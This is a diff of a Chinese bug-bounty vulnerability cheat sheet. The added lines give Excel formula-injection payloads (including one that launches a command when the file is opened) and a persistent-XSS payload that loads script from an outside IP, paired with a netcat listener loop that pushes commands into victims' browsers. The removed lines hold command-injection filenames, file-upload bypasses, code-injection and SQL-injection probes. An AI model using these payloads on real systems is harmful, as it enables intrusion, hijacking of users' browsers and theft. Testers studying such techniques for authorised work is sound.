@@ -23,35 +23,14 @@ SRC主流漏洞
 + 绕过技巧
     - 可利用不同浏览器的特性，构造一些非常规的url，具体方法再研究。
 
-文件上传漏洞
+文件导出（execl）
 ----------------------------------------
-+ FUZZ上传参数
-    - 对upload.php空白界面FUZZ参数名，爆破参数值，出现上传表单后上传shell。
-+ 绕过文件类型检测
-    - 修改type、fileType、breach等参数为0、1、2或all，绕过文件类型检测，上传成功。
-+ IE上传绕过
-    - 用IE打开上传点，上传马子，通过filename="1.asp";filename="1.jpg"绕过检测。
-+ RCE思路-重命名
-    - 原理：文件上传到服务器后，后台有task在轮询目录进行文件移动move，使用反撇号的优先级``执行任意命令
-    - 场景：
-    - 触发
-        ::
-
-            上传文件的"filename"参数改为 `sleep 5`
-            或如1.jpg|ping xxxx.xxx.xx
-            或如1.jpg;curl`whoami`.xxx.xx
-            注：漏洞触发前提可能是文件名需要自己传入的而不是服务器给的随机文件名。
-+ RCE思路-数组可控
-    - 原理：后端将文件名以数组的方式进行控制
-    - payload: ``siteName=11111').phpinfo();//``
-+ RCE思路-播放音乐
-    - 原理：GET .mp3文件，一般返回文件内容，但是返回其它信息，说明是一个接口，测试命令拼接。
-    - payload： ``1.wav|ping `whoami`.xxx.xx``
++ 标题姓名地址填写payload： ``=1+1``，查看导出的execl文件中标题是否变成 ``2`` 。
++ payload: ``=AND(2>1)``，查看导出的execl文件中是否显示 ``TRUE`` 。
++ payload： ``=cmd|' /C calc'!A0``，当用户打开文件时会执行命令。
 
 XSS
 ----------------------------------------
-+ WAF绕过
-    - 输出在JS内的闭合与注释；使用Function()代替eval()；atob解密base64加密的JS，绕过对alert()的过滤；反引号代替括号与引号，绕过对()的过滤。
 + APK在线分析
     - 对于apk中某些属性的页面显示，可能存在存储型xss的可能。
 + 文件上传型
@@ -65,13 +44,15 @@ XSS
 
             如果上传数据是：data:image/png;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
             可以修改为：data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
++ 反射型XSS持久化
+    - payload： ``<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//198.2.235.223:8888";d.body.appendChild(z)},5)</script>``
+    - vps上运行： ``while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 8888 >/dev/null; done`` , 如输入 ``alert('x')`` ,客户端就会弹出x。
+    - payload的意思是每隔5秒钟就向当前页面的body注入一段script，这个script会向vps发送一个请求，vps上监听8888端口，收到请求后会在控制台打印 ``ZephrFishHackerOne>$``，等待输入命令，输入命令后会发送到客户端执行。
 + 常见场景
     - 在线客服
     - 个人资料修改
     - 评论区
     - 文本编辑器（所有功能）
-+ 技巧
-    - 无法弹框的情况下，插入img:  ``<img src=""/>`` ,src加入黄色网站，赌博网站，钓鱼网站等
 + 命令
     - ``echo https://www.example.com/ | gau | gf xss| uro | Gxss | kxss | tee xss_output.txt``
     - ``python loxs.py``
@@ -133,17 +114,6 @@ CSRF
 + payload: ``${7*7}, {{7*7}}, <%= 7*7 %>``
 + 注入点： ``User-Agent、Referer、表单数据、URL参数、JSON请求体等``
 
-寻找SQL注入点
-----------------------------------------
-+ 除法可用： ``?id=2/1``
-+ 找到可执行的函数或方法
-    - ``?id=4/if(2=2,2,1)`` 即 ``?id=2``
-    - ``?id=4/if(length(user)=1,1,0)`` ：length方法可用
-    - ``?id=4/if(left('123',1)=1,1,0)`` :left方法可用
-    - ``?id=4/if(left(user,1)='a',1,1)`` :证明user可以用
-    - ``?id=1+and+sleep(10)`` :证明sleep函数可用
-+ 其它
-    - 一般java的网站sql注入会多一点
 
 越权
 ----------------------------------------
